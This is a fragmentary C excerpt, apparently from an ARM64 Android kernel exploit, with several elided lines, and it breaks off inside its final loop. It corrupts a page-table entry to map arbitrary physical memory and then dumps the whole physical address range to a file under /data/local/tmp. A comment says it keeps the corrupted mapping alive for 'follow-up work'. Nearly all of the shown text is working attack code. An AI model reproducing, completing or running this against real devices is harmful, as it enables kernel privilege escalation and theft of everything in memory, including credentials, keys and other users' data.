...
static int sys_openat_raw(int dirfd, const char *path, int flags, unsigned int mode) {
    register long x8 __asm__("x8") = __NR_openat;
    register long x0 __asm__("x0") = (long)dirfd;
    register long x1 __asm__("x1") = (long)(uintptr_t)path;
...
static void dump_physmem(uint64_t orig_pte, uint8_t *glitched_map) {
    const char *outpath = "/data/local/tmp/physmem.bin";

    p_str("[*] dumping physmem [");
    p_hex64(PHYS_MEM_BASE);
    p_str(", ");
    p_hex64(PHYS_MEM_END);
    p_str(") -> ");
    p_str(outpath);
    p_nl();

    int fd = sys_openat_raw(AT_FDCWD, outpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) die("open output failed");
    ...
    for (uintptr_t paddr = PHYS_MEM_BASE; paddr < PHYS_MEM_END; paddr += 0x1000) {
        *glitched_pte = (orig_pte & PTE_ATTRS_MASK) | (paddr & PTE_OA_MASK);
        ...
        ssize_t w = sys_write(fd, glitched_map, 0x1000);
        if (w != 0x1000) die("write failed");
    }
...
void _start(void) {
    ...
    *glitched_pte = (orig_pte & PTE_ATTRS_MASK) | (PHYS_MEM_BASE & PTE_OA_MASK);
    ...
    dump_physmem(orig_pte, glitched_map);

    /* stay alive so the glitched PTE remains usable for follow-up work */
    for (;;) {
        struct { long tv_sec; long tv_nsec; } ts = { 1 << 20, 0 };
